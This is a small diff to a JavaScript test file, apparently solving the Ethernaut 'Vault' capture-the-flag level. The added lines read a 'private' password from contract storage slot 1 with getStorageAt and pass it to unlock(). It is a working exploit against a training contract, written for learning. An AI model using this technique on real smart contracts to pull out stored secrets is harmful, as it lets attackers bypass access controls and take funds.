@@ -18,7 +18,8 @@ describe("Vault", async function () {
     });
 
     it("Exploit", async function () {
-
+        // Read "private" variable
+        await instance.unlock(await ethers.provider.getStorageAt(instance.address, 1));
     });
 
     after(async function () {
